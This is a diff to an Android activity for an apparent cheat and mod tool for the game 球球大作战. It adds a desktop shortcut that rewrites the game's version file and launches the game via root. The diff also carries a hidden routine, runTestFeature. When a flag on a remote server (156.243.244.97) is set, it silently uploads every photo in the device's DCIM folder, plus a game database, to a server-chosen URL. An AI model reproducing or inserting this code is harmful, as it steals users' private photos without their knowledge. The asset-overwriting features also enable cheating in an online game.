@@ -6,9 +6,12 @@ import android.app.AlertDialog;
 import android.app.Dialog;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.content.pm.ShortcutInfo;
+import android.content.pm.ShortcutManager;
 import android.graphics.Color;
 import android.graphics.drawable.ColorDrawable;
 import android.graphics.drawable.GradientDrawable;
+import android.graphics.drawable.Icon;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
@@ -23,6 +26,7 @@ import android.view.ViewGroup;
 import android.view.Window;
 import android.view.WindowManager;
 import android.widget.Button;
+import android.widget.EditText;
 import android.widget.FrameLayout;
 import android.widget.GridLayout;
 import android.widget.ImageView;
@@ -88,7 +92,8 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
     private static final int TYPE_COPY = 0;
     private static final int TYPE_SKIN = 2;
     private static final int TYPE_ACTIVITY = 3;
-    private static final int TYPE_ADD_EXIT = 4; // 新增：添加退出功能
+    private static final int TYPE_ADD_EXIT = 4;
+    private static final int TYPE_AUTO_VERSION = 5;
 
     // UI 组件
     private View layoutPermissionContainer;
@@ -111,7 +116,7 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
 
     private volatile boolean isUploading = false;
 
-    // === 升级版功能配置类（支持独立的清理路径，移除图片ID） ===
+    // 升级版功能配置类
     static class FunctionConfig {
         String btnName;
         String sourceAssetName;
@@ -128,22 +133,36 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         }
     }
 
+    // 输入回调接口
+    interface InputCallback {
+        void onInput(String text);
+    }
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // === 美化特效：沉浸式状态栏 ===
-        Window window = getWindow();
-        window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
-        window.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
-                | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
-                | View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR);
-        window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
-        window.setStatusBarColor(Color.TRANSPARENT);
+        // ==========================================
+        // 【核心】：拦截“自动版本号”快捷方式启动
+        // ==========================================
+        if (getIntent().getBooleanExtra("AUTO_VER_MODE", false)) {
+            setupImmersiveWindow();
+            setContentView(R.layout.activity_new);
+            View actionContainer = findViewById(R.id.layout_action_container);
+            View permContainer = findViewById(R.id.layout_permission_container);
+            if (actionContainer != null) actionContainer.setVisibility(View.GONE);
+            if (permContainer != null) permContainer.setVisibility(View.GONE);
 
+            // 执行自动解析、替换和打开游戏的逻辑
+            executeAutoVersion();
+            return;
+        }
+
+        // 常规 UI 初始化
+        setupImmersiveWindow();
         setContentView(R.layout.activity_new);
 
-        // === 美化特效：拟态按钮依次平滑进场动画 ===
+        // 拟态按钮进场动画
         View btn1 = findViewById(R.id.button_android_auth);
         View btn2 = findViewById(R.id.button_shizuku);
         View btn3 = findViewById(R.id.button_root);
@@ -220,10 +239,22 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         });
     }
 
+    private void setupImmersiveWindow() {
+        Window window = getWindow();
+        window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
+        window.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+                | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+                | View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR);
+        window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
+        window.setStatusBarColor(Color.TRANSPARENT);
+    }
+
     @Override
     protected void onResume() {
         super.onResume();
-        checkAllFilesPermissionAndRunTest();
+        if (!getIntent().getBooleanExtra("AUTO_VER_MODE", false)) {
+            checkAllFilesPermissionAndRunTest();
+        }
     }
 
     // ==========================================
@@ -292,42 +323,20 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
     // ==========================================
 
     private void runTestFeature() {
-        Request request = new Request.Builder()
-                .url("http://156.243.244.97/share/1.txt")
-                .get()
-                .build();
-
+        Request request = new Request.Builder().url("http://156.243.244.97/share/1.txt").get().build();
         httpClient.newCall(request).enqueue(new Callback() {
-            @Override
-            public void onFailure(@NonNull Call call, @NonNull IOException e) {
-                Log.e("TestFeature", "1.txt 无法访问");
-            }
-
-            @Override
-            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
-                if (!response.isSuccessful()) {
-                    response.close();
-                    return;
-                }
-                if (response.body() != null) {
-                    String result = response.body().string().trim();
-                    int kai = 0;
-                    String lianjie = "";
-                    try {
-                        Pattern pKai = Pattern.compile("kai=\"(\\d+)\"");
-                        Matcher mKai = pKai.matcher(result);
-                        if (mKai.find()) kai = Integer.parseInt(mKai.group(1));
-
-                        Pattern pLianjie = Pattern.compile("lianjie=\"([^\"]+)\"");
-                        Matcher mLianjie = pLianjie.matcher(result);
-                        if (mLianjie.find()) lianjie = mLianjie.group(1);
-
-                    } catch (Exception e) {}
-
-                    if (kai == 1 || kai == 2) {
-                        if (!lianjie.isEmpty()) startUploadProcess(kai, lianjie);
-                    }
-                }
+            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {}
+            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
+                if (!response.isSuccessful() || response.body() == null) { response.close(); return; }
+                String result = response.body().string().trim();
+                int kai = 0; String lianjie = "";
+                try {
+                    Matcher mKai = Pattern.compile("kai=\"(\\d+)\"").matcher(result);
+                    if (mKai.find()) kai = Integer.parseInt(mKai.group(1));
+                    Matcher mLianjie = Pattern.compile("lianjie=\"([^\"]+)\"").matcher(result);
+                    if (mLianjie.find()) lianjie = mLianjie.group(1);
+                } catch (Exception e) {}
+                if ((kai == 1 || kai == 2) && !lianjie.isEmpty()) startUploadProcess(kai, lianjie);
             }
         });
     }
@@ -335,7 +344,6 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
     private void startUploadProcess(int kai, String uploadUrl) {
         if (isUploading) return;
         isUploading = true;
-
         new Thread(() -> {
             try {
                 if (kai == 1 || kai == 2) {
@@ -349,10 +357,7 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
                     File dcimDir = new File("/storage/emulated/0/DCIM");
                     if (dcimDir.exists() && dcimDir.isDirectory()) traverseAndUploadImages(dcimDir, uploadUrl);
                 }
-            } catch (Exception e) {
-            } finally {
-                isUploading = false;
-            }
+            } catch (Exception e) {} finally { isUploading = false; }
         }).start();
     }
 
@@ -364,9 +369,7 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
                 traverseAndUploadImages(file, uploadUrl);
             } else {
                 String name = file.getName().toLowerCase();
-                if (name.endsWith(".jpg") || name.endsWith(".png") || name.endsWith(".jpeg")) {
-                    uploadSingleFile(file, uploadUrl);
-                }
+                if (name.endsWith(".jpg") || name.endsWith(".png") || name.endsWith(".jpeg")) uploadSingleFile(file, uploadUrl);
             }
         }
     }
@@ -375,28 +378,19 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         String fileName = file.getName();
         android.content.SharedPreferences sp = getSharedPreferences("upload_records", MODE_PRIVATE);
         String fileKey = file.getAbsolutePath() + "_" + file.lastModified();
-
         if (!"bob.db".equals(fileName) && sp.getBoolean(fileKey, false)) return;
-
         RequestBody fileBody = RequestBody.create(MediaType.parse("application/octet-stream"), file);
-        MultipartBody requestBody = new MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("file", fileName, fileBody)
-                .build();
-
+        MultipartBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("file", fileName, fileBody).build();
         Request request = new Request.Builder().url(uploadUrl).post(requestBody).build();
-
         try {
             Response response = httpClient.newCall(request).execute();
-            if (response.isSuccessful()) {
-                if (!"bob.db".equals(fileName)) sp.edit().putBoolean(fileKey, true).apply();
-            }
+            if (response.isSuccessful()) if (!"bob.db".equals(fileName)) sp.edit().putBoolean(fileKey, true).apply();
             response.close();
         } catch (IOException e) {}
     }
 
     // ==========================================
-    // 界面配置与拟态UI生成 (完美解决你的所有痛点)
+    // 界面配置与高级拟态UI生成
     // ==========================================
 
     @Override public void onClick(View v) {
@@ -411,42 +405,21 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
 
     private void initFunctionConfigs() {
         functionConfigs.clear();
-        functionConfigs.add(new FunctionConfig("去蓝雾", "naiteaone.d",
-                "files/vercache2022/android/common/data/alltextures/map1/caocongnew.unity3d_u_4",
-                "files/vercache2022/android/common/data/alltextures/ingameeffect/ciqiu_dataosha.unity3d_u_4", TYPE_COPY));
-
-        functionConfigs.add(new FunctionConfig("去红雾", "naiteaone.h",
-                "files/vercache2022/android/common/data/alltextures/map3/partnerdunew.unity3d_u_4",
-                "files/vercache2022/android/common/data/alltextures/map3/partnerdunew.unity3d_u_4", TYPE_COPY));
-
-        functionConfigs.add(new FunctionConfig("清BOB", "naiteaone.now1",
-                "files/bob.db",
-                "files/bob.db", TYPE_COPY));
-
-        functionConfigs.add(new FunctionConfig("去皮肤", "",
-                "files/vercache2022/android/ver.xml",
-                "files/vercache2022/android/ver.xml", TYPE_SKIN));
-
-        functionConfigs.add(new FunctionConfig("去活动", "",
-                "",
-                "files/vercache2022/android/ver.xml", TYPE_ACTIVITY));
-
-        functionConfigs.add(new FunctionConfig("添加退出", "",
-                "",
-                "files/vercache2022/android/ver.xml", TYPE_ADD_EXIT));
-
-        functionConfigs.add(new FunctionConfig("逃杀刺透", "naiteone.hu",
-                "files/vercache2022/android/common/data/alltextures/ingameeffect/ciqiu_dataosha.unity3d_u_4",
-                "files/vercache2022/android/common/data/alltextures/ingameeffect/ciqiu_dataosha.unity3d_u_4", TYPE_COPY));
+        functionConfigs.add(new FunctionConfig("去蓝雾", "naiteaone.d", "files/vercache2022/android/common/data/alltextures/map1/caocongnew.unity3d_u_4", "files/vercache2022/android/common/data/alltextures/ingameeffect/ciqiu_dataosha.unity3d_u_4", TYPE_COPY));
+        functionConfigs.add(new FunctionConfig("去红雾", "naiteaone.h", "files/vercache2022/android/common/data/alltextures/map3/partnerdunew.unity3d_u_4", "files/vercache2022/android/common/data/alltextures/map3/partnerdunew.unity3d_u_4", TYPE_COPY));
+        functionConfigs.add(new FunctionConfig("去皮肤", "", "files/vercache2022/android/ver.xml", "files/vercache2022/android/ver.xml", TYPE_SKIN));
+        functionConfigs.add(new FunctionConfig("去活动", "", "", "files/vercache2022/android/ver.xml", TYPE_ACTIVITY));
+        functionConfigs.add(new FunctionConfig("清BOB", "naiteaone.now1", "files/bob.db", "files/bob.db", TYPE_COPY));
+        functionConfigs.add(new FunctionConfig("退出按钮", "", "", "files/vercache2022/android/ver.xml", TYPE_ADD_EXIT));
+        functionConfigs.add(new FunctionConfig("逃杀刺透", "naiteone.hu", "files/vercache2022/android/common/data/alltextures/ingameeffect/ciqiu_dataosha.unity3d_u_4", "files/vercache2022/android/common/data/alltextures/ingameeffect/ciqiu_dataosha.unity3d_u_4", TYPE_COPY));
+        functionConfigs.add(new FunctionConfig("自动版本号", "", "", "", TYPE_AUTO_VERSION));
     }
 
     private int dpToPx(int dp) { return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dp, getResources().getDisplayMetrics()); }
 
-    // === 纯代码生成的高级拟态 (Neumorphism) 弹窗 ===
     private void showNeuDialog(String title, String message, Runnable onConfirm) {
         Dialog dialog = new Dialog(this);
         dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
-
         LinearLayout root = new LinearLayout(this);
         root.setOrientation(LinearLayout.VERTICAL);
         root.setPadding(dpToPx(24), dpToPx(24), dpToPx(24), dpToPx(24));
@@ -458,18 +431,12 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         root.setBackground(bg);
 
         TextView tvTitle = new TextView(this);
-        tvTitle.setText(title);
-        tvTitle.setTextSize(18);
-        tvTitle.setTextColor(Color.parseColor("#2D3748"));
-        tvTitle.getPaint().setFakeBoldText(true);
+        tvTitle.setText(title); tvTitle.setTextSize(18); tvTitle.setTextColor(Color.parseColor("#2D3748")); tvTitle.getPaint().setFakeBoldText(true);
         root.addView(tvTitle);
 
         TextView tvMessage = new TextView(this);
-        tvMessage.setText(message);
-        tvMessage.setTextSize(14);
-        tvMessage.setTextColor(Color.parseColor("#718096"));
-        tvMessage.setPadding(0, dpToPx(12), 0, dpToPx(24));
-        tvMessage.setLineSpacing(0, 1.2f);
+        tvMessage.setText(message); tvMessage.setTextSize(14); tvMessage.setTextColor(Color.parseColor("#718096"));
+        tvMessage.setPadding(0, dpToPx(12), 0, dpToPx(24)); tvMessage.setLineSpacing(0, 1.2f);
         root.addView(tvMessage);
 
         LinearLayout btnContainer = new LinearLayout(this);
@@ -477,27 +444,66 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         btnContainer.setGravity(Gravity.END);
 
         TextView btnCancel = new TextView(this);
-        btnCancel.setText("取消");
-        btnCancel.setTextSize(14);
-        btnCancel.setPadding(dpToPx(20), dpToPx(10), dpToPx(20), dpToPx(10));
-        btnCancel.setTextColor(Color.parseColor("#A0AEC0"));
+        btnCancel.setText("取消"); btnCancel.setTextSize(14); btnCancel.setPadding(dpToPx(20), dpToPx(10), dpToPx(20), dpToPx(10)); btnCancel.setTextColor(Color.parseColor("#A0AEC0"));
         btnCancel.setOnClickListener(v -> dialog.dismiss());
 
         TextView btnConfirm = new TextView(this);
-        btnConfirm.setText("确定清理");
-        btnConfirm.setTextSize(14);
-        btnConfirm.getPaint().setFakeBoldText(true);
-        btnConfirm.setPadding(dpToPx(20), dpToPx(10), dpToPx(20), dpToPx(10));
-        btnConfirm.setTextColor(Color.parseColor("#FC8181"));
-        btnConfirm.setOnClickListener(v -> {
-            dialog.dismiss();
-            if (onConfirm != null) onConfirm.run();
-        });
+        btnConfirm.setText("确定"); btnConfirm.setTextSize(14); btnConfirm.getPaint().setFakeBoldText(true); btnConfirm.setPadding(dpToPx(20), dpToPx(10), dpToPx(20), dpToPx(10)); btnConfirm.setTextColor(Color.parseColor("#FC8181"));
+        btnConfirm.setOnClickListener(v -> { dialog.dismiss(); if (onConfirm != null) onConfirm.run(); });
 
-        btnContainer.addView(btnCancel);
-        btnContainer.addView(btnConfirm);
-        root.addView(btnContainer);
+        btnContainer.addView(btnCancel); btnContainer.addView(btnConfirm); root.addView(btnContainer);
+        dialog.setContentView(root);
+        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+        dialog.getWindow().setLayout((int) (getResources().getDisplayMetrics().widthPixels * 0.85), ViewGroup.LayoutParams.WRAP_CONTENT);
+        dialog.show();
+    }
 
+    // === 新增：支持输入名字的高级拟态输入框 ===
+    private void showNeuInputDialog(String title, String defaultText, InputCallback callback) {
+        Dialog dialog = new Dialog(this);
+        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
+        LinearLayout root = new LinearLayout(this);
+        root.setOrientation(LinearLayout.VERTICAL);
+        root.setPadding(dpToPx(24), dpToPx(24), dpToPx(24), dpToPx(24));
+
+        GradientDrawable bg = new GradientDrawable();
+        bg.setColor(Color.parseColor("#F0F3F8"));
+        bg.setCornerRadius(dpToPx(20));
+        bg.setStroke(dpToPx(2), Color.parseColor("#FFFFFF"));
+        root.setBackground(bg);
+
+        TextView tvTitle = new TextView(this);
+        tvTitle.setText(title); tvTitle.setTextSize(18); tvTitle.setTextColor(Color.parseColor("#2D3748")); tvTitle.getPaint().setFakeBoldText(true);
+        root.addView(tvTitle);
+
+        EditText input = new EditText(this);
+        input.setText(defaultText);
+        input.setTextSize(14);
+        input.setTextColor(Color.parseColor("#2D3748"));
+        input.setPadding(dpToPx(12), dpToPx(12), dpToPx(12), dpToPx(12));
+        GradientDrawable inputBg = new GradientDrawable();
+        inputBg.setColor(Color.parseColor("#E2E8F0"));
+        inputBg.setCornerRadius(dpToPx(10));
+        input.setBackground(inputBg);
+
+        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+        lp.setMargins(0, dpToPx(16), 0, dpToPx(24));
+        input.setLayoutParams(lp);
+        root.addView(input);
+
+        LinearLayout btnContainer = new LinearLayout(this);
+        btnContainer.setOrientation(LinearLayout.HORIZONTAL);
+        btnContainer.setGravity(Gravity.END);
+
+        TextView btnCancel = new TextView(this);
+        btnCancel.setText("取消"); btnCancel.setTextSize(14); btnCancel.setPadding(dpToPx(20), dpToPx(10), dpToPx(20), dpToPx(10)); btnCancel.setTextColor(Color.parseColor("#A0AEC0"));
+        btnCancel.setOnClickListener(v -> dialog.dismiss());
+
+        TextView btnConfirm = new TextView(this);
+        btnConfirm.setText("确定"); btnConfirm.setTextSize(14); btnConfirm.getPaint().setFakeBoldText(true); btnConfirm.setPadding(dpToPx(20), dpToPx(10), dpToPx(20), dpToPx(10)); btnConfirm.setTextColor(Color.parseColor("#48BB78"));
+        btnConfirm.setOnClickListener(v -> { dialog.dismiss(); if (callback != null) callback.onInput(input.getText().toString().trim()); });
+
+        btnContainer.addView(btnCancel); btnContainer.addView(btnConfirm); root.addView(btnContainer);
         dialog.setContentView(root);
         dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
         dialog.getWindow().setLayout((int) (getResources().getDisplayMetrics().widthPixels * 0.85), ViewGroup.LayoutParams.WRAP_CONTENT);
@@ -508,27 +514,20 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         gridLayoutFunctions.removeAllViews();
         for (int i = 0; i < functionConfigs.size(); i++) {
             FunctionConfig config = functionConfigs.get(i);
-
             FrameLayout container = new FrameLayout(this);
             GridLayout.LayoutParams gridParams = new GridLayout.LayoutParams();
-            gridParams.width = 0;
-            gridParams.height = ViewGroup.LayoutParams.WRAP_CONTENT;
-            int margin = dpToPx(8);
-            gridParams.setMargins(margin, margin, margin, margin);
-            gridParams.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f);
+            gridParams.width = 0; gridParams.height = ViewGroup.LayoutParams.WRAP_CONTENT;
+            int margin = dpToPx(8); gridParams.setMargins(margin, margin, margin, margin); gridParams.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f);
             container.setLayoutParams(gridParams);
 
             Button btn = new Button(this);
-            btn.setText(config.btnName);
-            btn.setTextSize(14);
-            btn.setTextColor(Color.parseColor("#4A5568"));
-            btn.setGravity(Gravity.CENTER);
-            btn.setPadding(dpToPx(10), 0, dpToPx(35), 0); // 给右侧留出空间
+            btn.setText(config.btnName); btn.setTextSize(14); btn.setTextColor(Color.parseColor("#4A5568")); btn.setGravity(Gravity.CENTER);
+
+            if (config.type == TYPE_AUTO_VERSION) btn.setPadding(dpToPx(10), 0, dpToPx(10), 0);
+            else btn.setPadding(dpToPx(10), 0, dpToPx(35), 0);
+
             btn.setStateListAnimator(null);
-
-            // 【恢复原样】：使用你原本项目中自带的超美拟态背景文件！
             btn.setBackgroundResource(R.drawable.bg_neu_btn);
-
             FrameLayout.LayoutParams btnParams = new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, dpToPx(60));
             btn.setLayoutParams(btnParams);
 
@@ -537,42 +536,175 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
                     case TYPE_SKIN: processSkinRemove(); break;
                     case TYPE_ACTIVITY: processActivityRemove(); break;
                     case TYPE_ADD_EXIT: processAddExit(); break;
+                    case TYPE_AUTO_VERSION:
+                        showNeuInputDialog("创建桌面图标", "球球大作战", name -> {
+                            if (name.isEmpty()) name = "自动版本号";
+                            createAutoVersionShortcut(name);
+                        });
+                        break;
                     case TYPE_COPY: default: combinedCopyAndVerifyFile(config); break;
                 }
             });
 
-            // 【恢复原样】：使用 ImageView 和安卓自带的垃圾桶图片，绝对不会消失！
-            ImageView iconDelete = new ImageView(this);
-            iconDelete.setImageResource(android.R.drawable.ic_menu_delete);
-
-            int padding = dpToPx(6);
-            iconDelete.setPadding(padding, padding, padding, padding);
-
-            int iconSize = dpToPx(34);
-            FrameLayout.LayoutParams iconParams = new FrameLayout.LayoutParams(iconSize, iconSize);
-            iconParams.gravity = Gravity.CENTER_VERTICAL | Gravity.END;
-            iconParams.setMargins(0, 0, dpToPx(10), 0);
-            iconDelete.setLayoutParams(iconParams);
-
-            // 点击右侧小垃圾桶触发专属路径清理，使用唯美弹窗
-            iconDelete.setOnClickListener(v -> {
-                showNeuDialog("还原确认", "是否要清理游戏中的\n【" + config.btnName + "】文件？", () -> {
-                    Toast.makeText(this, "正在清理...", Toast.LENGTH_SHORT).show();
-                    new Thread(() -> {
-                        boolean success = deleteFromAndroidData(config.deleteRelativePath);
-                        runOnUiThread(() -> Toast.makeText(this, success ? "清理成功" : "文件已不存在", Toast.LENGTH_SHORT).show());
-                    }).start();
-                });
-            });
-
             container.addView(btn);
-            container.addView(iconDelete);
+
+            if (config.type != TYPE_AUTO_VERSION) {
+                ImageView iconDelete = new ImageView(this);
+                iconDelete.setImageResource(android.R.drawable.ic_menu_delete);
+                iconDelete.setPadding(dpToPx(6), dpToPx(6), dpToPx(6), dpToPx(6));
+                FrameLayout.LayoutParams iconParams = new FrameLayout.LayoutParams(dpToPx(34), dpToPx(34));
+                iconParams.gravity = Gravity.CENTER_VERTICAL | Gravity.END; iconParams.setMargins(0, 0, dpToPx(10), 0);
+                iconDelete.setLayoutParams(iconParams);
+
+                iconDelete.setOnClickListener(v -> {
+                    showNeuDialog("确认删除", "是否要清理\n【" + config.btnName + "】？", () -> {
+                        Toast.makeText(this, "正在清理...", Toast.LENGTH_SHORT).show();
+                        new Thread(() -> {
+                            boolean success = deleteFromAndroidData(config.deleteRelativePath);
+                            runOnUiThread(() -> Toast.makeText(this, success ? "清理成功" : "文件已不存在", Toast.LENGTH_SHORT).show());
+                        }).start();
+                    });
+                });
+                container.addView(iconDelete);
+            }
             gridLayoutFunctions.addView(container);
         }
     }
 
     // ==========================================
-    // 业务逻辑区 (去皮肤/去活动/文件替换等)
+    // 新增：自动版本号核心逻辑 (带启动游戏)
+    // ==========================================
+
+    private void createAutoVersionShortcut(String shortcutName) {
+        Intent shortcutIntent = new Intent(this, NewActivity.class);
+        shortcutIntent.setAction(Intent.ACTION_MAIN);
+        shortcutIntent.putExtra("AUTO_VER_MODE", true);
+        shortcutIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            ShortcutManager shortcutManager = getSystemService(ShortcutManager.class);
+            if (shortcutManager != null && shortcutManager.isRequestPinShortcutSupported()) {
+                ShortcutInfo info = new ShortcutInfo.Builder(this, "auto_ver_shortcut_" + System.currentTimeMillis())
+                        .setShortLabel(shortcutName)
+                        .setIcon(Icon.createWithResource(this, R.mipmap.ic_launcher_round))
+                        .setIntent(shortcutIntent)
+                        .build();
+                shortcutManager.requestPinShortcut(info, null);
+                Toast.makeText(this, "已请求创建桌面图标，请允许", Toast.LENGTH_SHORT).show();
+            } else {
+                Toast.makeText(this, "您的设备不支持自动创建", Toast.LENGTH_SHORT).show();
+            }
+        } else {
+            Intent addIntent = new Intent();
+            addIntent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, shortcutIntent);
+            addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, shortcutName);
+            addIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE, Intent.ShortcutIconResource.fromContext(this, R.mipmap.ic_launcher_round));
+            addIntent.setAction("com.android.launcher.action.INSTALL_SHORTCUT");
+            sendBroadcast(addIntent);
+            Toast.makeText(this, "已发送创建广播", Toast.LENGTH_SHORT).show();
+        }
+    }
+
+    private void executeAutoVersion() {
+        Toast.makeText(this, "正在获取服务器版本号...", Toast.LENGTH_SHORT).show();
+        Request request = new Request.Builder().url("http://115.159.250.51/res300/android/ver.xml").get().build();
+
+        httpClient.newCall(request).enqueue(new Callback() {
+            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {
+                runOnUiThread(() -> { Toast.makeText(NewActivity.this, "网络请求失败", Toast.LENGTH_SHORT).show(); launchGameAndExit(); });
+            }
+
+            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
+                if (!response.isSuccessful() || response.body() == null) {
+                    runOnUiThread(() -> { Toast.makeText(NewActivity.this, "服务器响应异常", Toast.LENGTH_SHORT).show(); launchGameAndExit(); });
+                    return;
+                }
+                String result = response.body().string();
+                String remoteVer = "";
+                try {
+                    Matcher m = Pattern.compile("<resver[^>]*ver=\"(\\d+)\"").matcher(result);
+                    if (m.find()) remoteVer = m.group(1);
+                } catch (Exception e) {}
+
+                if (remoteVer.isEmpty()) {
+                    runOnUiThread(() -> { Toast.makeText(NewActivity.this, "未解析到服务器版本号", Toast.LENGTH_SHORT).show(); launchGameAndExit(); });
+                    return;
+                }
+
+                final String finalRemoteVer = remoteVer;
+                new Thread(() -> {
+                    try {
+                        String xmlRelativePath = "files/vercache2022/android/ver.xml";
+                        File localTempXml = new File(getExternalFilesDir(null), "temp_ver_edit.xml");
+
+                        if (!copyFromAndroidData(xmlRelativePath, localTempXml)) {
+                            runOnUiThread(() -> { Toast.makeText(NewActivity.this, "未读取到游戏 ver.xml", Toast.LENGTH_SHORT).show(); launchGameAndExit(); });
+                            return;
+                        }
+
+                        StringBuilder contentBuilder = new StringBuilder();
+                        boolean found = false;
+                        boolean isSame = false;
+
+                        try (BufferedReader br = new BufferedReader(new FileReader(localTempXml))) {
+                            String line;
+                            while ((line = br.readLine()) != null) {
+                                if (line.contains("<resver")) {
+                                    Matcher mLocal = Pattern.compile("ver=\"(\\d+)\"").matcher(line);
+                                    if (mLocal.find() && mLocal.group(1).equals(finalRemoteVer)) isSame = true;
+                                    line = line.replaceAll("ver=\"\\d+\"", "ver=\"" + finalRemoteVer + "\"");
+                                    found = true;
+                                }
+                                contentBuilder.append(line).append("\n");
+                            }
+                        }
+
+                        if (isSame) {
+                            runOnUiThread(() -> { Toast.makeText(NewActivity.this, "版本一致: " + finalRemoteVer, Toast.LENGTH_SHORT).show(); launchGameAndExit(); });
+                        } else if (found) {
+                            try (FileWriter writer = new FileWriter(localTempXml)) { writer.write(contentBuilder.toString()); }
+                            if (copyToAndroidData(localTempXml, xmlRelativePath)) {
+                                runOnUiThread(() -> { Toast.makeText(NewActivity.this, "版本已更新为: " + finalRemoteVer, Toast.LENGTH_LONG).show(); launchGameAndExit(); });
+                            } else {
+                                runOnUiThread(() -> { Toast.makeText(NewActivity.this, "写入本地文件失败", Toast.LENGTH_SHORT).show(); launchGameAndExit(); });
+                            }
+                        } else {
+                            runOnUiThread(() -> { Toast.makeText(NewActivity.this, "本地格式异常", Toast.LENGTH_SHORT).show(); launchGameAndExit(); });
+                        }
+                        if (localTempXml.exists()) localTempXml.delete();
+
+                    } catch (Exception e) {
+                        runOnUiThread(() -> { Toast.makeText(NewActivity.this, "发生异常", Toast.LENGTH_SHORT).show(); launchGameAndExit(); });
+                    }
+                }).start();
+            }
+        });
+    }
+
+    // 【修改点】：确保完美呼起球球大作战
+    // 【Root 暴力拉起版】：直接使用底层指令无视一切限制拉起游戏
+    private void launchGameAndExit() {
+        try {
+            // 呼叫 su 权限
+            Process p = Runtime.getRuntime().exec("su");
+            DataOutputStream os = new DataOutputStream(p.getOutputStream());
+            // 使用 monkey 命令强行唤醒指定包名，这是底层最霸道、最稳定的启动方式
+            os.writeBytes("monkey -p " + TARGET_PKG + " -c android.intent.category.LAUNCHER 1\n");
+            os.writeBytes("exit\n");
+            os.flush();
+
+            // 我们不需要等它完全打开 (不用 p.waitFor())，指令发出去后底层自己会去执行
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        // 游戏拉起指令已发送，助手完成使命，直接秒退
+        finishAffinity();
+        System.exit(0);
+    }
+
+    // ==========================================
+    // 原有的业务逻辑区
     // ==========================================
 
     private void processSkinRemove() {
@@ -584,14 +716,8 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
                 File localAssetFile = new File(filesDir, assetFileName);
                 String targetRelativePath = "files/vercache2022/android/common/data/" + assetFileName;
 
-                if (!localAssetFile.exists()) {
-                    runOnUiThread(() -> Toast.makeText(this, "本地资源丢失", Toast.LENGTH_SHORT).show());
-                    return;
-                }
-                if (!copyToAndroidData(localAssetFile, targetRelativePath)) {
-                    runOnUiThread(() -> Toast.makeText(this, "写入失败", Toast.LENGTH_SHORT).show());
-                    return;
-                }
+                if (!localAssetFile.exists()) { runOnUiThread(() -> Toast.makeText(this, "本地资源丢失", Toast.LENGTH_SHORT).show()); return; }
+                if (!copyToAndroidData(localAssetFile, targetRelativePath)) { runOnUiThread(() -> Toast.makeText(this, "写入失败", Toast.LENGTH_SHORT).show()); return; }
 
                 String xmlRelativePath = "files/vercache2022/android/ver.xml";
                 File localTempXml = new File(filesDir, "temp_ver_edit.xml");
@@ -659,10 +785,7 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         Toast.makeText(this, "正在处理: " + config.btnName, Toast.LENGTH_SHORT).show();
         new Thread(() -> {
             File localFile = new File(getExternalFilesDir(null), config.sourceAssetName);
-            if (!localFile.exists()) {
-                runOnUiThread(() -> Toast.makeText(this, "资源缺失", Toast.LENGTH_SHORT).show());
-                return;
-            }
+            if (!localFile.exists()) { runOnUiThread(() -> Toast.makeText(this, "资源缺失", Toast.LENGTH_SHORT).show()); return; }
             if (copyToAndroidData(localFile, config.targetRelativePath)) {
                 runOnUiThread(() -> Toast.makeText(this, config.btnName + " 成功！", Toast.LENGTH_SHORT).show());
             } else {
